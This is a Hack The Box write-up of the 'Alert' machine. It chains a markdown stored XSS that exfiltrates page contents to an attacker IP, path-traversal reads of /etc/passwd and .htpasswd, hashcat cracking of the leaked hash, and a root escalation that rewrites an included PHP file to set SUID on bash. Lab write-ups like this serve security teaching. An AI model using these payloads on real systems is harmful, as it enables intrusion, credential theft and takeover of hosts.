@@ -1,0 +1,483 @@
+---
+title: Alert Writeup - Hack The Box
+description: Performing XSS, Arbitrary File Read and Password cracking to get initial access, and then monitoring the processes to escalate privileges
+author: Nontas Bakoulas
+date: 2025-10-04
+category: HTB Machines
+reading_time: 15
+---
+
+## Enumeration
+Let's start with an `nmap` scan:
+```console title="Nmap scan"
+nontas@local$ nmap -sV -sC 10.129.231.188
+Starting Nmap 7.93 ( https://nmap.org ) at 2025-10-03 19:53 EEST
+Nmap scan report for 10.129.231.188
+Host is up (0.052s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 7e462c466ee6d1eb2d9d3425e63614a7 (RSA)
+|   256 457b2095ec17c5b4d8865081e08ce8b8 (ECDSA)
+|_  256 cb92ad6bfcc88e5e9f8ca2691b6dd0f7 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Did not follow redirect to http://alert.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 63.45 seconds
+```
+
+There's an attempted redirect to `http://alert.htb/`, so we add it to the `/etc/hosts` file:
+```console title="Add host entry"
+nontas@local$ sudo echo "10.129.231.188 alert.htb" >> /etc/hosts
+```
+
+We're now able to view the website:
+![Website homepage](/images/blog/alert/20251003200009.png)
+
+![Website features](/images/blog/alert/20251003200216.png)
+
+![Markdown viewer](/images/blog/alert/20251003200231.png)
+
+![Contact form](/images/blog/alert/20251003200243.png)
+
+We peform some fuzzing to search for directories:
+```console title="Directory fuzzing"
+nontas@local$ ffuf -w /opt/lists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://alert.htb/FUZZ/ -ic
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://alert.htb/FUZZ/
+ :: Wordlist         : FUZZ: /opt/lists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+                        [Status: 302, Size: 660, Words: 123, Lines: 24, Duration: 60ms]
+icons                   [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 94ms]
+uploads                 [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 91ms]
+css                     [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 53ms]
+messages                [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 398ms]
+```
+all of them return `403` so we cannot access them.
+
+Let's try fuzzing with the `.php` extension:
+```console title="PHP file fuzzing"
+nontas@local$ ffuf -w /opt/lists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://alert.htb/FUZZ -ic -e .php 
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://alert.htb/FUZZ
+ :: Wordlist         : FUZZ: /opt/lists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+ :: Extensions       : .php 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+                        [Status: 302, Size: 660, Words: 123, Lines: 24, Duration: 57ms]
+.php                    [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 63ms]
+index.php               [Status: 302, Size: 660, Words: 123, Lines: 24, Duration: 67ms]
+contact.php             [Status: 200, Size: 24, Words: 3, Lines: 2, Duration: 73ms]
+uploads                 [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 91ms]
+css                     [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 89ms]
+messages                [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 92ms]
+messages.php            [Status: 200, Size: 1, Words: 1, Lines: 2, Duration: 100ms]
+```
+- `contact.php` shows "Error: Invalid request" and nothing else.
+- `messages.php` shows nothing.
+
+We now perform `vhost` fuzzing:
+```console title="Vhost fuzzing"
+nontas@local$ ffuf -w /opt/lists/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://alert.htb -ic -H 'Host: FUZZ.alert.htb' -fc 301
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://alert.htb
+ :: Wordlist         : FUZZ: /opt/lists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+ :: Header           : Host: FUZZ.alert.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response status: 301
+________________________________________________
+
+statistics              [Status: 401, Size: 467, Words: 42, Lines: 15, Duration: 87ms]
+```
+
+We add `statistics.alert.htb` to the `/etc/hosts` file.
+
+If we visit the website, we get a sign in prompt: ![Login prompt](/images/blog/alert/20251003210247.png)
+We don't have any credentials for now, so we'll leave it at that. 
+
+Let's go back to the "Markdown Viewer" page and upload a random markdown file: ![Markdown upload](/images/blog/alert/20251003225717.png)
+there's also a "Share Markdown" button that makes a GET request with a query parameter `link_share`.
+
+## Initial Foothold
+### XSS
+Markdown supports HTML tags, so we can try injecting `script` tags. Learn more [here](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/xss-in-markdown.html).
+```markdown title="XSS in markdown"
+<script>
+  alert(1)
+</script>
+```
+and we actually see the alert back to us: ![XSS alert](/images/blog/alert/20251003230426.png)
+
+Our goal now is to:
+1. Create a JS script that will grab the `messages.php` file and send it to a local listener (base64 encoded). Since we cannot view this file, we expect the moderator to have the privileges to do so.
+2. Inject stored XSS in the markdown file. It should include a `<script src="...">` tag with our file in step 1.
+3. Grab the share link.
+4. Give the link to the moderator via the "Contact Us" page, since they probably open links.
+5. Wait and pray
+
+Let's craft our JS payload. It will make a GET request to `/messages.php`, get the text and give it back to us in base64 encoding.
+```js
+async function run() {
+  const res = await fetch("http://alert.htb/messages.php");
+  const text = await res.text();
+  await fetch("http://10.10.14.78:1234/?content=" + btoa(text));
+}
+
+run();
+```
+
+we'll save this file in `payload.js` and serve it via a python web server:
+```console title="Python web server"
+nontas@local$ python3 -m http.server 8082
+Serving HTTP on 0.0.0.0 port 8082 (http://0.0.0.0:8082/) ...
+```
+
+Inside the `.md` file, we'll include this js file like so:
+```html
+<script src="http://10.10.14.78:8082/payload.js"></script>
+```
+
+Now start the `nc` listener:
+```console title="Netcat listener"
+nontas@local$ nc -lnvp 1234              
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::1234
+Ncat: Listening on 0.0.0.0:1234
+```
+
+and give the share link to the moderator: ![Share link to moderator](/images/blog/alert/20251003234403.png)
+
+We do get a response back:
+```console title="Netcat response"
+nontas@local$ nc -lnvp 1234
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 10.129.231.188.
+Ncat: Connection from 10.129.231.188:57452.
+GET /?content=PGgxPk1lc3NhZ2VzPC9oMT48dWw+PGxpPjxhIGhyZWY9J21lc3NhZ2VzLnBocD9maWxlPTIwMjQtMDMtMTBfMTUtNDgtMzQudHh0Jz4yMDI0LTAzLTEwXzE1LTQ4LTM0LnR4dDwvYT48L2xpPjwvdWw+Cg== HTTP/1.1
+Host: 10.10.14.78:1234
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.111 Safari/537.36
+Accept: */*
+Origin: http://alert.htb
+Referer: http://alert.htb/
+Accept-Encoding: gzip, deflate
+```
+
+Decode the file:
+```console title="Base64 decode"
+nontas@local$ echo "PGgxPk1lc3NhZ2VzPC9oMT48dWw+PGxpPjxhIGhyZWY9J21lc3NhZ2VzLnBocD9maWxlPTIwMjQtMDMtMTBfMTUtNDgtMzQudHh0Jz4yMDI0LTAzLTEwXzE1LTQ4LTM0LnR4dDwvYT48L2xpPjwvdWw+Cg==" | base64 -d                          
+<h1>Messages</h1><ul><li><a href='messages.php?file=2024-03-10_15-48-34.txt'>2024-03-10_15-48-34.txt</a></li></ul>
+```
+there's a `file` parameter with a value of `2024-03-10_15-48-34.txt`.
+
+Since we cannot interact with the parameter ourselves (nothing shows up), we can try checking for an **Arbitrary File Read** vulnerability.
+
+### Arbitrary File Read
+First, we'll modify our payload like so:
+```js
+async function run() {
+  const res = await fetch("http://alert.htb/messages.php?file=../../../../../../etc/passwd");
+  const text = await res.text();
+  await fetch("http://10.10.14.78:1234/?content=" + btoa(text));
+}
+
+run();
+```
+
+Repeating the steps just like before, we're able to read `/etc/passwd`, so it is vulnerable to Arbitrary File Read.
+
+The users with a bash shell are `root`, `albert` and `david`.
+
+Now we need to read the Apache virtual host configuration file located at `/etc/apache2/sites-available/000-default.conf`:
+```js
+async function run() {
+  const res = await fetch("http://alert.htb/messages.php?file=../../../../../../etc/apache2/sites-available/000-default.conf");
+  const text = await res.text();
+  await fetch("http://10.10.14.78:1234/?content=" + btoa(text));
+}
+
+run();
+```
+
+and we get the following:
+```apache title="Apache virtual host config"
+<pre><VirtualHost *:80>
+    ServerName alert.htb
+
+    DocumentRoot /var/www/alert.htb
+
+    <Directory /var/www/alert.htb>
+        Options FollowSymLinks MultiViews
+        AllowOverride All
+    </Directory>
+
+    RewriteEngine On
+    RewriteCond %{HTTP_HOST} !^alert\.htb$
+    RewriteCond %{HTTP_HOST} !^$
+    RewriteRule ^/?(.*)$ http://alert.htb/$1 [R=301,L]
+
+    ErrorLog ${APACHE_LOG_DIR}/error.log
+    CustomLog ${APACHE_LOG_DIR}/access.log combined
+</VirtualHost>
+
+<VirtualHost *:80>
+    ServerName statistics.alert.htb
+
+    DocumentRoot /var/www/statistics.alert.htb
+
+    <Directory /var/www/statistics.alert.htb>
+        Options FollowSymLinks MultiViews
+        AllowOverride All
+    </Directory>
+
+    <Directory /var/www/statistics.alert.htb>
+        Options Indexes FollowSymLinks MultiViews
+        AllowOverride All
+        AuthType Basic
+        AuthName "Restricted Area"
+        AuthUserFile /var/www/statistics.alert.htb/.htpasswd
+        Require valid-user
+    </Directory>
+
+    ErrorLog ${APACHE_LOG_DIR}/error.log
+    CustomLog ${APACHE_LOG_DIR}/access.log combined
+</VirtualHost>
+
+</pre>
+```
+We see that there's the file `/var/www/statistics.alert.htb/.htpasswd` that stores the hashed passwords.
+
+View the file:
+```js
+async function run() {
+  const res = await fetch("http://alert.htb/messages.php?file=../../../../../../var/www/statistics.alert.htb/.htpasswd");
+  const text = await res.text();
+  await fetch("http://10.10.14.78:1234/?content=" + btoa(text));
+}
+
+run();
+```
+
+```txt
+<pre>albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
+</pre>
+```
+
+### Password Cracking
+The hashed password is an **MD5-based Apache password hash**, seen from `$apr1$`. Save it to the file `hash_file`.
+
+We attempt to crack it via `hashcat`:
+```console title="Hashcat password cracking"
+nontas@local$ hashcat -a 0 -m 1600 hash_file /usr/share/wordlists/rockyou.txt
+<SNIP>
+$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/:manchesterunited    
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 1600 (Apache $apr1$ MD5, md5apr1, MD5 (APR))
+<SNIP>
+```
+
+The password is `manchesterunited`.
+
+Now we can login: ![Statistics login](/images/blog/alert/20251004002207.png)
+
+And the following shows up: ![Statistics dashboard](/images/blog/alert/20251004002402.png)
+doesn't seem very useful.
+
+We can actually use the same credentials `albert:manchesterunited` to SSH into the server:
+```console title="SSH login"
+nontas@local$ ssh albert@alert.htb
+albert@alert:~$ ls
+user.txt
+```
+and we get the user flag.
+
+## Privilege Escalation
+Running `LinEnum.sh` on the remote (or just `netstat -tulnp`) shows the following:
+```txt
+[-] Listening TCP:
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -
+```
+
+Port `8080` is listening on `localhost`. There may be a hidden website running.
+
+Let's forward the `8080` port into our `9090` port:
+```console title="SSH port forward"
+ssh albert@alert.htb -L 9090:127.0.0.1:8080
+```
+
+The website hosted is the following: ![Website monitor](/images/blog/alert/20251004014121.png)
+It has the name "Website Monitor".
+
+Using a tool like [pspy](https://github.com/DominicBreuker/pspy), we can see all processes running:
+```console title="Process monitoring"
+albert@alert:~$ ./pspy64
+<SNIP>
+2025/10/03 22:13:01 CMD: UID=0     PID=6616   | /bin/sh -c /usr/bin/php -f /opt/website-monitor/monitor.php >/dev/null 2>&1 
+2025/10/03 22:13:01 CMD: UID=0     PID=6617   | /usr/bin/php -f /opt/website-monitor/monitor.php
+<SNIP>
+```
+
+As we can see, the file `/opt/website-monitor/monitor.php` is being run as root.
+
+```php title="Monitor PHP script"
+<?php
+/*
+
+Website Monitor
+===============
+
+Hello! This is the monitor script, which does the actual monitoring of websites
+stored in monitors.json.
+
+You can run this manually, but it's probably better if you use a cron job.
+Here's an example of a crontab entry that will run it every minute:
+
+* * * * * /usr/bin/php -f /path/to/monitor.php >/dev/null 2>&1
+
+*/
+
+include('config/configuration.php');
+
+$monitors = json_decode(file_get_contents(PATH.'/monitors.json'));
+
+foreach($monitors as $name => $url) {
+	$response_data = array();
+	$timestamp = time();
+	$response_data[$timestamp]['timestamp'] = $timestamp;
+	$curl = curl_init($url);
+	curl_setopt($curl, CURLOPT_URL, $url);
+	curl_setopt($curl, CURLOPT_HEADER, true);
+	curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+	$response = curl_exec($curl);
+	if(curl_exec($curl) === false) {
+		$response_data[$timestamp]['error'] = curl_error($curl);
+	}
+	else {
+		$info = curl_getinfo($curl);
+		$http_code = $info['http_code'];
+		$ms = $info['total_time_us'] / 1000;
+		$response_data[$timestamp]['time'] = $ms;
+		$response_data[$timestamp]['response'] = $http_code;
+	}
+	
+	curl_close($curl);
+	if(file_exists(PATH.'/monitors/'.$name)) {
+		$data = json_decode(file_get_contents(PATH.'/monitors/'.$name), TRUE);
+	}
+	else {
+		$data = array();
+	}
+	$data = array_merge($data, $response_data);
+	$data = array_slice($data, -60);
+	file_put_contents(PATH.'/monitors/'.$name, json_encode($data, JSON_PRETTY_PRINT));
+}
+```
+We don't have access to modify it, but as we can see it includes the file `config/configuration.php` which we do have write access:
+```console title="File permissions"
+albert@alert:~$ ls -l /opt/website-monitor/config/configuration.php 
+-rwxrwxr-x 1 root management 49 Nov  5  2024 /opt/website-monitor/config/configuration.php
+```
+since `albert` belongs to the `management` group:
+```console
+albert@alert:~$ id -nG
+albert management
+```
+
+The file `/opt/website-monitor/config/configuration.php` has the following code:
+```console
+albert@alert:~$ cat /opt/website-monitor/config/configuration.php 
+<?php
+define('PATH', '/opt/website-monitor');
+?>
+```
+
+we'll modify it to:
+```php title="Privilege escalation payload"
+<?php
+system("chmod u+s /bin/bash");
+?>
+```
+so we can run `bash` as `root` (enables the `SUID` bit).
+
+<Callout title="Note" type="info">
+  You might not be able to edit it directly with `nano` or `vi`. Create a new file first `exploit.php` with the above code, and then:
+```bash
+cat exploit.php > configuration.php
+```
+</Callout>
+
+Now do:
+```console title="Root shell"
+albert@alert:/opt/website-monitor/config$ bash -p
+bash-5.0# id
+uid=1000(albert) gid=1000(albert) euid=0(root) groups=1000(albert),1001(management)
+bash-5.0# whoami
+root
+bash-5.0# ls /root
+root.txt  scripts
+```
+and get the root flag.
+
+We have completed the **Alert** machine!
